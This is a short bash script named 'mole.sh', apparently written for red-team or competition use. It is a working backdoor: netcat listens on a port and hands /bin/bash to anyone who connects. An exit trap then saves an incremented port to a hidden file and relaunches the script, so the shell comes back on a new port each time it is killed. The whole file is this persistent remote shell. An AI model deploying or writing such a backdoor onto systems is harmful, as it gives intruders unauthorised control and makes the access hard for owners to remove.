#!/bin/bash
#Creates an netcat listener on incrementing ports
#Author: Hunter Sisson (hts4885@rit.edu)
#Last Modified: 02/11/2025
#Usage ./mole.sh

#IF FIRST RUN: creates a varaible text file for storage. Then creates a listener on a specified port.
#IF NOT FIRST RUN: refers to the varaible file, opens listener on that port
#ON EXIT: increment port by 1 and save it

#starting port
PORT=5000

#check for variable text file (.port.txt)
if [[ -f .port.txt ]]; then
	source .port.txt
else
	echo "PORT=$PORT" > .port.txt
fi

#function to start the listener
attempt_listener(){
	while true; do
		nc -lvnp $PORT -c "echo \"IF THE CONNECTION IS LOST TRY PORT \\\"$PORT\\\"\"; /bin/bash"
		exit 1
	done
}

#exit function
cleanup(){
	#VERY IMPORTANT COULD BRICK DEVICE IF TOUCHED
	if [[ -f important.txt ]]; then
		exit 0
	fi

	((++PORT))
	echo "PORT=$PORT" > .port.txt
	exec bash ./mole.sh
}

#on file shutdown
trap cleanup EXIT

#attempt to start listener
attempt_listener